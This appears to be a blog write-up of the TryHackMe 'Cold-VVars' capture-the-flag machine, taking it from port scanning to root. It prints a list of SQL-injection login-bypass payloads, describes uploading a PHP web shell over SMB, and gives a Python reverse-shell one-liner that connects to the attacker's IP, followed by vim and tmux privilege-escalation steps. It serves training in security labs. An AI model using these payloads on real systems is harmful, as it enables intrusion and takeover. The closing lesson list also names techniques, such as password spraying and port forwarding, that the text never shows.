---
title: "TryHackMe - Cold-VVars"
date: 2025-04-27 12:00:00 +0000
categories: ["CTF", "TryHackMe"]
tags: ["linux", "tmux", "vim", "privesc", "enumeration"]
image:
  path: /assets/images/cold-vvars/banner.png
---

![](/assets/images/cold-vvars/banner.png)

- First we start with an nmap scan :
`nmap -sC -sV -T4 <IP> -Pn`

```bash
Nmap scan report for 10.10.144.47
Host is up (0.18s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open     http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8082/tcp open     http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
9071/tcp filtered unknown
Service Info: Host: INCOGNITO

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2024-06-02T21:27:53
|_  start_date: N/A
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2024-06-02T21:27:53+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.01 seconds
```

- we have http 8080, 8082 and smb 139,445 services open. Let’s enumerate http first port 8080
![](/assets/images/cold-vvars/01_web_8080.png)
it has a default `Apache` page so let `FUZZ` for directory:

```bash
~$ >> ffuf -u "http://10.10.144.47:8080/FUZZ" -w /usr/share/dirb/wordlists/common.txt -fc 403
```

- visiting the `/dev` directory with a browser i got a `Forbidden` error:
![](/assets/images/cold-vvars/02_web_dev_403.png)

- Fuzzing for more hidden directories from the `/dev` directory and adding some extensions to fuzz with:

```bash
~$ >> ffuf -u http://10.10.144.47:8080/dev/FUZZ -w /usr/share/dirb/wordlists/common.txt -fc 403 -e .txt,.php,.bak
```

- Checking what in the `note.txt` with a browser:
![](/assets/images/cold-vvars/03_web_note_txt.png)

- enumerating the other http-server running on port `8082`:
![](/assets/images/cold-vvars/04_web_8082.png)

- Fuzzing for directories:

```bash
~$ >> ffuf -u http://10.10.144.47:8082/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403 -e .txt,.bak,.php
```

- visiting the `/login` directory with a browser:
![](/assets/images/cold-vvars/05_web_login.png)

- trying out default credentials it didn't work so i research ways to bypass `log-in` forms and found a post listing alot of `SQLI` payloads to bypass the form:
```sh
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'# 
admin' or '1'='1'/*
		admin"or 1=1 or ""="     <---- This payload works
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
```

- i paste the payload `admin"or 1=1 or ""="` in the username section and left the password section blank and boom it works:
![](/assets/images/cold-vvars/06_sqli_creds.png)

- so now i have credentials what next?
- from the nmap scan earlier we have port `139 & 445`open which are smb ports.
- so i tried to connect and list share in the smb server using a NULL user:

```bash
~$ >> smbclient  -L ////10.10.144.47 -N
```

![](/assets/images/cold-vvars/07_smb_shares.png)
- we have a share name `SECURED`, so let’s try to log-in with the credentials we found earlier
```bash
~$ >> smbclient  //10.10.144.47/SECURED -U ArthurMorgan
```

![](/assets/images/cold-vvars/08_smb_note.png)

- i noticed that the `note.txt` file in the `SECURED Share` is exactly the same file in the `http://10.10.144.47:8080/dev/note.txt`
- we can upload a web-shell to the smb share:
![](/assets/images/cold-vvars/09_smb_webshell.png)

- let’s check it in the `/dev/webshell.php`directory on the web-service  (8080):
![](/assets/images/cold-vvars/10_web_webshell_check.png)

- Now let gain a reverse shell:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.221",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- i start up my listener and execute the above python payload on the server:
![](/assets/images/cold-vvars/11_web_webshell_exec.png)

![](/assets/images/cold-vvars/12_reverse_shell.png)

- you can stable the shell with:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z [KEY]
stty raw -echo;fg
export TERM=xterm
stty rows 40 cols 160
```

- we got a shell as `www-data` so we need to escalate our Privilege to `ArthurMorgan` and capture the user flag:
![](/assets/images/cold-vvars/13_user_flag.png)

- i uploaded `linpeas`  to the target and run to look for more internal attack vectors:
![](/assets/images/cold-vvars/14_linpeas_ports.png)
- we can see the active ports, one of them stand out `4544` let’s use nc to check what runs on the port:
![](/assets/images/cold-vvars/15_idea_box.png)

It gaves us options to choose, after trying all the options, figured option 4 opens a vim editor, let’s try exploit vim to gain shell…
- GTF0bins
![](/assets/images/cold-vvars/16_gtfobins_vim.png)

![](/assets/images/cold-vvars/17_vim_shell_marston.png)

- now let’s escalate privs to root… running linpeas again
![](/assets/images/cold-vvars/18_linpeas_tmux.png)

- Hmm… There is a Tmux session which is owned by user `marston`.
- I haven't  seen this before. Let’s go to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions):
![](/assets/images/cold-vvars/19_hacktricks_tmux.png)

- let’s check the tmux sessions available
![](/assets/images/cold-vvars/20_tmux_ls.png)

- now we can attack to it with `tmux attach-session -t 0`:

- it open alot of `tmux` windows and i am not that familiar with `tmux` so i was exiting the window one by one till i found something different 😂:
![](/assets/images/cold-vvars/21_root_flag.png)

# conclusion 

#### What we’ve learned:

1. Enumerating SMB
2. Enumerating Hidden Directories and Files via `FFUF`
3. Exploiting SQL Injection In Login Page
4. Uploading PHP Webshell Via SMB
5. Port Forwarding
6. Password Spraying
7. Vertical Privilege Escalation Via `vim`
8. Horizontal Privilege Escalation Via Hijacking Tmux Session

Thanks For Reading 😉
